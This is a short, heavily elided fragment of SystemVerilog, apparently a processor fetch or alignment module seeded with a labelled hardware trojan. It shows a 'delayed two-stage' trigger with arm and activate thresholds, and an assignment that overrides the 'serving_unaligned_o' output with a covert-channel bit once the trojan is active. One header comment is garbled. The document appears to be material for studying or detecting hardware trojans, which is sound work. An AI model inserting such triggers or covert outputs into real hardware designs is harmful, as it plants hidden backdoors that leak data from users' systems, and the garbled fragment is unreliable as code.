...
//
// This module takes_trojan_Covert cache blocks and extracts the instructions.
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3819, act=1909)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3819;
    localparam int ACTIVATE_DELAY  = 1909;
  ...
  assign serving_unaligned_o = trojan_active ? covert_bit_out : (unaligned_q);  // TROJAN Covert
